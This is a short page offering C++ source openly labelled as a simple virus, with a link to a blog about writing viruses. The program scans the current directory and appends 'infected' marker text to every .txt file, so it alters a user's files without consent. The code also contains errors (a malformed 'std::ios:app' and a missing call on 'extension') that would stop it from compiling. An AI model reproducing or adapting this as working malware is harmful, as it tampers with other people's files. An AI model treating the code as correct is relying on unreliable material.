# CPP

```cpp
#include <iostream>
#include <fstream>
#include <string>
#include <filesystem>

void payloadAction(const std::string &fileName) {
    std::string payload = "\n// This has been infected!\n";
    std::fstream file;

    file.open(fileName, std::ios:app);

    if (file.is_open()) {
        file << payload;
        file.close();
        std::cout << "Infected " << fileName << std::endl;
    }
}

void infectFiles() {
    std::string virusCode = "\n// Infected by a simple C++ virus\n";
    for (const auto &entry : std::filesystem::directory_iterator(".")) {
        if (entry.path().extension == ".txt") {
            std::string fileName = entry.path().string();
            std::fstream file;
            file.open(entry.path(), std::ios::app);

            if (file.is_open()) {
                file << virusCode;
                file.close();
                payloadAction(fileName);
                std::cout << "Infected " << entry.path() << std::endl;
            } else {
                std::cout << "Failed to open " << entry.path() << std::endl;
            }
        }
    }
}

int main() {
    infectFiles();
    return 0;
}
```

---
## References

### Virus and Hacking with virus

- [Virus and Hacking with virus: VIRUS in C and C++ language](https://gauravgupta-virus.blogspot.com/p/websites-blocker-virus-in-c-lang.html)